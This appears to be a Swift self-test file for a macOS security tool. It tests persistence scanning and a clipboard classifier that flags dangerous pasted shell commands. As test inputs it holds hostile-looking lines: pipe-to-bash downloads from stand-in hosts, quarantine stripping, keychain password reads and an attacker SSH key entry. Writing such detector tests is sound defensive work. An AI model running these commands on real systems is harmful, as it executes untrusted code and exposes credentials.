                             UUID: 11111111-0000-0000-0000-000000000003
                             Name: Helper
                             Type: login item (0x4)
                              URL: /Applications/Helper.app
                  Executable Path: Contents/MacOS/Helper
            """
            let b = PersistenceScanner.parseBTM(btm)
            check(b.count == 2, "BTM parse skips developer headers (\(b.count))")
            check(b.first { $0.item.label == "com.docker.vmnetd" }?.attributes["teamID"] == "9BNSXJN65R", "BTM team id")
            check(b.first { $0.item.kind == .loginItem }?.item.target == "/Applications/Helper.app/Contents/MacOS/Helper", "BTM relative exe resolved")
            let sx = PersistenceScanner.parseSystemExtensions("1 extension(s)\n--- com.apple.system_extension.driver_extension (x)\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\t5JZGQTGU4W\tcn.wch.CH34xVCPDriver (1.0/1)\tcn.wch.CH34xVCPDriver\t[activated enabled]\n")
            check(sx.count == 1 && sx[0].attributes["teamID"] == "5JZGQTGU4W" && sx[0].attributes["version"] == "1.0/1", "systemextensionsctl parse")
            let pr = PersistenceScanner.parseProfiles("user[1] attribute: profileIdentifier: com.example.proxy\nThere are 1 user configuration profiles installed for 'user'\n")
            check(pr.count == 1 && pr[0].item.label == "com.example.proxy", "profiles parse")
            let cr = PersistenceScanner.parseCrontab("# c\nPATH=/bin\n*/5 * * * * /Users/Shared/.u/run.sh >/dev/null\n@reboot /tmp/x\n", source: "crontab:u")
            check(cr.count == 2 && cr[0].item.target == "/Users/Shared/.u/run.sh", "crontab parse")
            let keyBlob = Data((0..<51).map { UInt8($0) }).base64EncodedString()
            let ak = PersistenceScanner.parseAuthorizedKeys("no-pty ssh-ed25519 \(keyBlob) attacker@box\n# x\n", path: "/x/authorized_keys")
            check(ak.count == 1 && ak[0].attributes["comment"] == "attacker@box" && ak[0].attributes["fingerprint"]?.hasPrefix("SHA256:") == true, "authorized_keys parse")
            let ff = PersistenceScanner.parseFirefoxAddons([
                ["id": "a@b", "type": "extension", "location": "app-profile", "defaultLocale": ["name": "Helper"], "sourceURI": "https://addons.mozilla.org/x.xpi",
                 "userPermissions": ["permissions": ["cookies"], "origins": ["<all_urls>"]]],
                ["id": "builtin@mozilla", "type": "extension", "location": "app-builtin"]], profileDir: "/p")
            check(ff.count == 1 && ff[0].item.label == "Firefox: Helper" && ff[0].attributes["fromWebstore"] == "1", "firefox addons parse")
            check(PersistenceScanner.suspiciousShellLines("export PATH=/a\neval \"$(/opt/homebrew/bin/brew shellenv)\"\ncurl -s http://x | bash\n").count == 1, "rc line classifier")

            // Chromium extension fixture with __MSG_ name and sideload flag
            let prof = scratch + "/Chrome/Default"
            let ext = prof + "/Extensions/abcdefghijklmnopabcdefghijklmnop/1.2_0"
            try? fm.createDirectory(atPath: ext + "/_locales/en", withIntermediateDirectories: true)
            try? #"{"name":"__MSG_appName__","default_locale":"en","version":"1.2","permissions":["cookies","nativeMessaging"],"host_permissions":["<all_urls>"]}"#.write(toFile: ext + "/manifest.json", atomically: true, encoding: .utf8)
            try? #"{"appName":{"message":"Coupon Helper"}}"#.write(toFile: ext + "/_locales/en/messages.json", atomically: true, encoding: .utf8)
            try? #"{"extensions":{"settings":{"abcdefghijklmnopabcdefghijklmnop":{"from_webstore":false,"location":4}}}}"#.write(toFile: prof + "/Secure Preferences", atomically: true, encoding: .utf8)
            let ce = PersistenceScanner(config: PersistenceScanConfig(home: scratch, kinds: [.browserExtension], runCommands: false))
            _ = ce
            let recs = PersistenceScannerFixtures.chromium(profileDir: prof)
            check(recs.count == 1 && recs[0].item.label == "Chrome (Default): Coupon Helper", "chromium manifest name resolved (\(recs.first?.item.label ?? "-"))")
            let eng = BehaviourEngine(signing: behaviourTestSigning)
            let dets = eng.evaluatePersistence(added: recs)
            let rids = Set(dets.flatMap { $0.evidence.map { String($0.title.prefix(3)) } })
            check(rids.contains("R20") && rids.contains("R21"), "sideloaded high-permission extension fires R20+R21 (\(rids.sorted()))")
        }

        // --- Differ on a scratch LaunchAgents dir ---
        do {
            let la = scratch + "/DifferAgents"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            var cfg = PersistenceScanConfig(home: scratch, kinds: [.launchAgent], runCommands: false)
            cfg.launchAgentDirs = [la]
            let sc = PersistenceScanner(config: cfg, signing: behaviourTestSigning)
            let base = PersistenceSnapshot(records: sc.scanRecords())
            let baseURL = URL(fileURLWithPath: scratch + "/baseline.json")
            try? base.save(to: baseURL)
            let label = "com.rampart.test.\(UUID().uuidString)"
            let p = la + "/\(label).plist"
            let obj: [String: Any] = ["Label": label, "ProgramArguments": ["/tmp/com.rampart.test.bin"], "RunAtLoad": true]
            try? PropertyListSerialization.data(fromPropertyList: obj, format: .xml, options: 0).write(to: URL(fileURLWithPath: p))
            let loaded = (try? PersistenceSnapshot.load(from: baseURL)) ?? base
            let now = PersistenceSnapshot(records: sc.scanRecords())
            let diff = PersistenceDiffer.diff(baseline: loaded, current: now)
            check(diff.added.count == 1 && diff.added[0].item.label == label, "differ detects new com.rampart.test plist")
            var partial = PersistenceSnapshot(records: [])
            partial.incompleteKinds = [.launchAgent]
            check(PersistenceDiffer.diff(baseline: now, current: partial).removed.isEmpty, "incomplete kinds are not reported as removed")
            check(diff.added.first?.item.target == "/tmp/com.rampart.test.bin" && diff.added.first?.attributes["runAtLoad"] == "1", "plist ProgramArguments parsed")
            let eng = BehaviourEngine(signing: behaviourTestSigning)
            let dets = eng.evaluatePersistence(added: diff.added)
            check(dets.contains { $0.evidence.contains { $0.title.hasPrefix("R07") } && $0.confidence >= 60 }, "new agent → untrusted temp target alerts (R07)")
            // via the event path too
            let evDets = diff.events().flatMap { BehaviourEngine(signing: behaviourTestSigning).process($0) }
            check(evDets.contains { $0.evidence.contains { $0.title.hasPrefix("R07") } }, "differ events feed the engine")
            let obj2: [String: Any] = ["Label": label, "ProgramArguments": ["/tmp/com.rampart.test.bin", "--x"]]
            try? PropertyListSerialization.data(fromPropertyList: obj2, format: .xml, options: 0).write(to: URL(fileURLWithPath: p))
            let d2 = PersistenceDiffer.diff(baseline: now, current: PersistenceSnapshot(records: sc.scanRecords()))
            check(d2.changed.count == 1, "differ detects changed plist")
            try? fm.removeItem(atPath: p)
            let d3 = PersistenceDiffer.diff(baseline: now, current: PersistenceSnapshot(records: sc.scanRecords()))
            check(d3.removed.count == 1, "differ detects removed plist")
        }

        pasteGuardTests()

        // --- Non-root scans never spawn authorization-prompting commands (sfltool) ---
        do {
            final class Recorder: @unchecked Sendable { var calls: [String] = []; let lock = NSLock()
                func add(_ c: String) { lock.lock(); calls.append(c); lock.unlock() } }
            let rec = Recorder()
            let runner: PersistenceCommandRunner = { path, args, _ in rec.add(([path] + args).joined(separator: " ")); return (0, "") }
            var cfg = PersistenceScanConfig(home: scratch)
            cfg.launchAgentDirs = []; cfg.launchDaemonDirs = []
            let user = PersistenceScanner(config: cfg, runner: runner, isRoot: false)
            _ = user.scanRecords()
            check(!rec.calls.contains { $0.contains("sfltool") }, "non-root scan never invokes sfltool (\(rec.calls))")
            check(rec.calls.allSatisfy { PersistenceScanner.nonRootCommands.contains($0) }, "non-root scan runs only no-prompt commands")
            check(user.lastIncompleteKinds.isSuperset(of: [.btm, .loginItem]), "non-root scan marks BTM and login items incomplete")
            let snap = user.snapshot()
            check(Set(snap.incompleteKinds ?? []).isSuperset(of: [.btm, .loginItem]), "snapshot carries incomplete BTM kinds")
            let rec2 = Recorder()
            var rootCfg = cfg; rootCfg.noPrivilegedTools = false   // fake runner: nothing is spawned
            let root = PersistenceScanner(config: rootCfg, runner: { p, a, _ in rec2.add(([p] + a).joined(separator: " ")); return (0, "") }, isRoot: true)
            _ = root.scanRecords()
            check(rec2.calls.contains("/usr/bin/sfltool dumpbtm") && rec2.calls.contains("/usr/bin/profiles list -all"), "root scan uses sfltool and profiles -all")
            let rec3 = Recorder()
            var npCfg = cfg; npCfg.noPrivilegedTools = true
            let np = PersistenceScanner(config: npCfg, runner: { p, a, _ in rec3.add(([p] + a).joined(separator: " ")); return (0, "") }, isRoot: true)
            _ = np.scanRecords()
            check(!rec3.calls.contains { c in PersistenceScanner.privilegedTools.contains { c.hasPrefix($0) } },
                  "RAMPART_NO_PRIVILEGED_TOOLS: sfltool/profiles/systemextensionsctl never spawned, even as root (\(rec3.calls))")
            check(np.lastIncompleteKinds.isSuperset(of: [.btm, .loginItem, .profile, .systemExtension]), "privileged kinds reported incomplete")
        }

        // --- Live scan of this Mac (read-only) ---
        do {
            let t0 = Date()
            // Filesystem-only live scan: the runner spawns nothing (ZERO POP-UPS rule); command output comes from fixtures above.
            let scanner = PersistenceScanner(runner: { _, _, _ in nil }, isRoot: false)
            let liveSnap = scanner.snapshot()
            let recs = liveSnap.records
            if !scanner.lastIncompleteKinds.isEmpty { print("   live scan incomplete kinds (source slow/unavailable): \(scanner.lastIncompleteKinds.map(\.rawValue).sorted())") }
            let byKind = Dictionary(grouping: recs, by: { $0.item.kind.rawValue }).mapValues(\.count)
            print("   live scan: \(recs.count) items in \(String(format: "%.1f", Date().timeIntervalSince(t0))) s: \(byKind.sorted { $0.key < $1.key })")
            check(recs.count > 0, "live persistence scan returns items")
            check(Set(recs.map(\.id)).count == recs.count, "live scan ids unique")
            check(!recs.contains { $0.item.kind == .browserExtension && $0.item.label.contains("__MSG_") }, "live extension names resolved from _locales")
            for r in recs where r.item.kind == .browserExtension { print("     ext: \(r.item.label)") }
            let snap = PersistenceSnapshot(records: recs)
            check(PersistenceDiffer.diff(baseline: snap, current: snap).isEmpty, "self-diff is empty")
        }
    }
}

/// Small shim so the self-test can call the internal chromium parser through a public entry.
enum PersistenceScannerFixtures {
    static func chromium(profileDir: String) -> [PersistenceRecord] {
        PersistenceScanner.chromiumExtensionRecords(profileDir: profileDir, browser: "Chrome")
    }
}

// MARK: - PasteGuard tests (private named pasteboard only; no sample command is ever executed)

/// Inert stub: "RAMPART-SYNTHETIC-<n>" in the text forces local score n, so blocking paths are tested
/// without authoring attack strings. Everything else goes to the real classifier.
struct MarkerClassifier: PasteLocalClassifier {
    func classify(_ text: String) -> PasteLocalResult {
        if let r = text.range(of: #"RAMPART-SYNTHETIC-(\d+)"#, options: .regularExpression),
           let n = Int(text[r].split(separator: "-").last ?? "") {
            return PasteLocalResult(runIntended: true, score: n, categories: [.downloadExecute], reasons: ["synthetic marker \(n)"])
        }
        return PasteClassifier().classify(text)
    }
}
final class FixedAI: PasteAIAssessor, @unchecked Sendable {
    let verdict: PasteAIVerdict?; var lastCommand: String?; var delay: Double
    init(_ v: PasteAIVerdict?, delay: Double = 0) { verdict = v; self.delay = delay }
    func assess(command: String, decoded: [String], sourceApp: String?) async -> PasteAIVerdict? {
        lastCommand = command
        if delay > 0 { try? await Task.sleep(nanoseconds: UInt64(delay * 1e9)) }
        return verdict
    }
}
final class WaitBox<T>: @unchecked Sendable { var v: T?; init() {} }
func waitTask<T>(_ task: Task<T, Never>?) -> T? {
    guard let task else { return nil }
    let box = WaitBox<T>(); let sem = DispatchSemaphore(value: 0)
    Task { box.v = await task.value; sem.signal() }
    _ = sem.wait(timeout: .now() + 20)
    return box.v
}

extension SelfTest {
    static func pasteGuardTests() {
        // Decision table rows
        let D = PasteGuardDecision.decide
        let mal = { (c: Int) in PasteAIVerdict(label: .malicious, confidence: c) }
        check(D(95, nil).action == .block && D(95, nil).rule.hasPrefix("B1"), "B1 local ≥ 90 blocks")
        check(D(45, mal(90)).rule.hasPrefix("B2"), "B2 AI malicious ≥ 85 + local ≥ 40 blocks")
        check(D(39, mal(99)).action == .warn, "AI alone cannot block when local < 40")
        check(D(72, mal(50)).rule.hasPrefix("B3"), "B3 both malicious blocks")
        check(D(85, PasteAIVerdict(label: .benign, confidence: 90)).rule.hasPrefix("W1"), "W1 local 40–89 warns even if AI says benign")
        check(D(10, mal(60)).rule.hasPrefix("W2"), "W2 AI malicious warns")
        check(D(10, PasteAIVerdict(label: .suspicious, confidence: 70)).rule.hasPrefix("W3"), "W3 AI suspicious ≥ 60 warns")
        check(D(10, PasteAIVerdict(label: .suspicious, confidence: 40)).action == .allow, "low-confidence suspicious allows")
        check(D(0, nil).action == .allow, "A1 allows")

        // Run intent + benign developer commands
        let c = PasteClassifier()
        check(!PasteClassifier.isRunIntended("Meeting moved to 3pm, see you there"), "prose is not run-intended")
        check(!PasteClassifier.isRunIntended("https://example.com/page"), "a bare URL is not run-intended")
        for cmd in ["git status", "swift build -c release", "ls -la | grep foo", "npm install", "brew install wget", "cd ~/src && make test",
                    "docker compose up -d", "python3 -m venv .venv && source .venv/bin/activate"] {
            let r = c.classify(cmd)
            check(r.runIntended && r.score < 40, "benign dev command passes: \(cmd) (\(r.score))")
        }
        let installers = [
            ("/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"", "Homebrew"),
            ("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh", "rustup"),
            ("curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash", "nvm"),
            ("sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"", "Oh My Zsh"),
            ("curl -fsSL https://get.docker.com | sh", "Docker"),
        ]
        for (cmd, name) in installers {
            let r = c.classify(cmd)
            check(r.allowedInstaller == name && r.score == 0, "pinned installer allowed: \(name)")
        }
        let unpinned = c.classify("curl -fsSL https://installer.example.test/install.sh | bash")
        check(unpinned.allowedInstaller == nil && unpinned.score >= 40 && unpinned.score < 90 && unpinned.categories.contains(.downloadExecute),
              "unpinned download-and-run is flagged but not blocked locally (\(unpinned.score))")
        let sameHostOtherPath = c.classify("curl -fsSL https://raw.githubusercontent.com/someone/tools/main/install.sh | bash")
        check(sameHostOtherPath.allowedInstaller == nil, "pin is host plus path, not host alone")

        // Category recognition on everyday admin commands (none blocked on their own)
        let q = c.classify("xattr -d com.apple.quarantine ~/Downloads/Tool.app")
        check(q.categories.contains(.quarantineStrip) && q.score < 90, "quarantine strip recognised (\(q.score))")
        let p = c.classify("launchctl load ~/Library/LaunchAgents/com.rampart.test.plist")
        check(p.categories.contains(.persistence) && p.score < 90, "persistence recognised (\(p.score))")
        let k = c.classify("security find-generic-password -s com.rampart.test.item")
        check(k.categories.contains(.credentialAccess), "keychain access recognised")

        // De-obfuscation (harmless content only)
        let b64 = Data("echo hello rampart test".utf8).base64EncodedString()
        check(PasteClassifier.decodeLayers("echo \(b64) | base64 -d").contains { $0.contains("hello rampart test") }, "base64 layer decoded")
        let nested = Data("echo \(b64) | base64 -d".utf8).base64EncodedString()
        check(PasteClassifier.decodeLayers("echo \(nested) | base64 -d").contains { $0.contains("hello rampart test") }, "two nested base64 layers decoded")
        check(PasteClassifier.decodeLayers("echo hello%20rampart%20test").contains { $0.contains("hello rampart test") }, "URL encoding decoded")
        check(PasteClassifier.decodeLayers("printf '\\x68\\x65\\x6c\\x6c\\x6f'").contains { $0.contains("hello") }, "hex escapes decoded")
        check(PasteClassifier.deobfuscate("ec\"\"ho he'l'\"\"lo") == "echo he'l'lo" || PasteClassifier.deobfuscate("\"ec\"\"ho\" hi").contains("echo"), "string concatenation removed")
        let harmlessEncoded = c.classify("echo \(b64) | base64 -d")
        check(harmlessEncoded.categories.contains(.obfuscation) && harmlessEncoded.score < 90, "encoded harmless text is not blocked (\(harmlessEncoded.score))")

        // Redaction before AI
        let red = PasteClassifier.redact("mysql -u root -p hunter2secret && curl -H 'Authorization: Bearer abcdef123456' https://api.example.test")
        check(!red.contains("hunter2secret") && !red.contains("abcdef123456"), "secrets redacted (\(red))")

        // End-to-end on a PRIVATE named pasteboard
        let name = NSPasteboard.Name("com.rampart.test.\(UUID().uuidString)")
        let pb = NSPasteboard(name: name)
        defer { pb.releaseGlobally() }
        let board = SystemPasteboard(pb)
        func put(_ text: String, extraType: String? = nil) {
            pb.clearContents()
            var types: [NSPasteboard.PasteboardType] = [.string]
            if let e = extraType { types.append(NSPasteboard.PasteboardType(e)) }
            pb.declareTypes(types, owner: nil)
            pb.setString(text, forType: .string)
            if let e = extraType { pb.setString("1", forType: NSPasteboard.PasteboardType(e)) }
        }
        func guardWith(_ ai: PasteAIAssessor?, timeout: Double = 4) -> PasteGuard {
            var cfg = PasteGuardConfig(); cfg.aiTimeout = timeout
            let g = PasteGuard(pasteboard: board, config: cfg, classifier: MarkerClassifier(), ai: ai)
            g.sourceAppProvider = { "Safari" }
            return g
        }

        do {
            let g = guardWith(nil)
            final class Sink: @unchecked Sendable { var d: [Detection] = []; var e: [SecurityEvent] = [] }
            let sink = Sink()
            g.onDetection = { sink.d.append($0) }
            g.onEvent = { sink.e.append($0) }
            let original = "echo RAMPART-SYNTHETIC-95 https://payload.example.test/run.sh"
            put(original)
            let o = waitTask(g.poll())
            check(o?.action == .block, "synthetic score 95 is blocked")
            check(pb.string(forType: .string) == PasteGuard.replacementText(sourceApp: "Safari"), "clipboard replaced with harmless comment")
            check(PasteGuard.replacementText(sourceApp: "Safari").hasPrefix("# "), "replacement is a shell comment")
            check(sink.d.first?.severity == .critical && sink.d.first?.name == "Dangerous pasted command blocked", "block emits critical detection")
            check(g.blockedItems.first?.original == original, "original kept in memory for review")
            check(sink.e.first?.detail["paste_verdict"] == "malicious" && sink.e.first?.detail["clip_tokens"] != nil
                  && !(sink.e.first?.detail.values.contains { $0.contains("payload.example.test") } ?? true), "event carries token hashes, not text")
            check(g.poll() == nil, "own replacement is not re-assessed")
            let id = g.blockedItems.first!.id
            check(!g.restore(id: id, confirmed: false) && pb.string(forType: .string) != original, "restore needs confirmation")
            check(g.restore(id: id, confirmed: true) && pb.string(forType: .string) == original, "restore puts original back after confirmation")
            check(g.poll() == nil && g.blockedItems.isEmpty, "restored content is not re-blocked")
        }
        do {
            let g = guardWith(nil)
            put("brew install wget")
            let o = waitTask(g.poll())
            check(o?.action == .allow && pb.string(forType: .string) == "brew install wget", "benign command left on the clipboard")
            put("echo RAMPART-SYNTHETIC-99", extraType: "org.nspasteboard.ConcealedType")
            check(g.poll() == nil && pb.string(forType: .string) == "echo RAMPART-SYNTHETIC-99", "password-manager concealed content is skipped")
            put("Lunch at noon?")
            check(g.poll() == nil, "non-command text is not assessed")
        }
        // Mocked AI: every decision branch end-to-end
        let cases: [(Int, PasteAIVerdict?, PasteAction, String)] = [
            (50, PasteAIVerdict(label: .malicious, confidence: 90, reasons: ["mock"]), .block, "B2"),
            (75, PasteAIVerdict(label: .malicious, confidence: 50), .block, "B3"),
            (50, PasteAIVerdict(label: .benign, confidence: 90), .warn, "W1"),
            (20, PasteAIVerdict(label: .malicious, confidence: 60), .warn, "W2"),
            (10, PasteAIVerdict(label: .suspicious, confidence: 70), .warn, "W3"),
            (10, PasteAIVerdict(label: .benign, confidence: 95), .allow, "A1"),
            (10, nil, .allow, "A1"),
        ]
        for (score, v, want, row) in cases {
            let g = guardWith(FixedAI(v))
            let text = "echo RAMPART-SYNTHETIC-\(score) sample.test"
            put(text)
            let o = waitTask(g.poll())
            check(o?.action == want && o?.decisionRule.hasPrefix(row) == true, "AI mock row \(row): local \(score), AI \(v?.label.rawValue ?? "nil") → \(want) (got \(o?.decisionRule ?? "-"))")
            let blockedNow = pb.string(forType: .string) != text
            check(blockedNow == (want == .block), "clipboard changed only on block (\(row))")
            if want == .warn { check(o?.detection?.severity == .medium, "warn detection is calm/medium (\(row))") }
        }
        // Timeout falls back to local
        do {
            let slow = FixedAI(PasteAIVerdict(label: .benign, confidence: 99), delay: 10)
            let g = guardWith(slow, timeout: 0.5)
            put("echo RAMPART-SYNTHETIC-95 sample.test")
            let t0 = Date()
            let o = waitTask(g.poll())
            check(o?.aiTimedOut == true && o?.action == .block && Date().timeIntervalSince(t0) < 4, "AI timeout falls back to local block")
            let g2 = guardWith(FixedAI(nil, delay: 10), timeout: 0.5)
            put("echo RAMPART-SYNTHETIC-50 sample.test")
            check(waitTask(g2.poll())?.action == .warn, "AI timeout with local 50 warns")
        }
        // AI sees redacted text only
        do {
            let rec = FixedAI(PasteAIVerdict(label: .benign, confidence: 50))
            let g = guardWith(rec)
            put("sudo mysql -u root -p hunter2secret -e 'select 1' && curl -u admin:hunter3secret https://api.example.test/status")
            _ = waitTask(g.poll())
            check(rec.lastCommand != nil && !(rec.lastCommand!.contains("hunter2secret")) && !(rec.lastCommand!.contains("hunter3secret")), "AI receives redacted command (\(rec.lastCommand ?? "nil"))")
        }
        // Suspicious paste arms R31 with a higher score in the engine
        do {
            let g = guardWith(nil)
            final class Sink: @unchecked Sendable { var e: [SecurityEvent] = [] }
            let sink = Sink(); g.onEvent = { sink.e.append($0) }
            let text = "echo RAMPART-SYNTHETIC-50 https://payload.example.test/run.sh"
            put(text)
            _ = waitTask(g.poll())
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            if var ev = sink.e.first { ev.date = sim.t; sim.feed(ev) }
            sim.exec("/bin/echo", ["RAMPART-SYNTHETIC-50", "https://payload.example.test/run.sh"], parent: zsh)
            check(sim.ruleIDs.contains("R31") && sim.detections.contains { $0.evidence.contains { $0.detail.contains("PasteGuard rated") } },
                  "PasteGuard warning arms R31 with a boost")
        }
        // Access behaviour: contents are read only when the behaviour is alwaysAllow.
        do {
            final class FakeBoard: PasteboardAccess {
                var accessBehavior: PasteAccessBehavior = .alwaysAllow
                var changeCount = 1
                var reads = 0, typeReads = 0, detects = 0
                var text = "echo RAMPART-SYNTHETIC-95 sample.test"
                var types: [String] { typeReads += 1; return ["public.utf8-plain-text"] }
                func string() -> String? { reads += 1; return text }
                func replace(with t: String) -> Int { text = t; changeCount += 1; return changeCount }
                func detectLink() async -> Bool? { detects += 1; return false }
            }
            final class Behaviour: @unchecked Sendable { var v: PasteAccessBehavior = .ask }
            let fb = FakeBoard()
            let current = Behaviour()
            let g = PasteGuard(pasteboard: fb, classifier: MarkerClassifier())
            g.accessProvider = { current.v }
            g.sourceAppProvider = { "Safari" }
            final class Statuses: @unchecked Sendable { var s: [PasteGuardStatus] = [] }
            let st = Statuses(); g.onStatusChange = { st.s.append($0) }
            for b in [PasteAccessBehavior.ask, .default, .alwaysDeny] {
                current.v = b
                fb.changeCount += 1
                check(g.poll() == nil, "no assessment when access is \(b.rawValue)")
                check(fb.reads == 0 && fb.typeReads == 0, "no pasteboard read when access is \(b.rawValue)")
            }
            check(st.s.contains(.needsPermission) && g.status == .denied, "status reports needsPermission then denied (\(st.s.map(\.rawValue)))")
            check(g.unreadChanges == 2, "unread changes counted without reading (\(g.unreadChanges))")
            current.v = .alwaysDeny
            g.start()
            check(g.status == .denied, "start() with alwaysDeny stays disabled")
            current.v = .alwaysAllow
            check(g.refreshStatus() == .active, "status active once the user allows")
            fb.changeCount += 1
            let o = waitTask(g.poll())
            check(fb.reads == 1 && o?.action == .block && fb.text.hasPrefix("# RamPart"), "reads and guards only with alwaysAllow")
            g.stop()
        }

        // The user's general pasteboard was never touched by these tests.
        check(board.pasteboard.name != .general, "tests used a private pasteboard")
    }
}
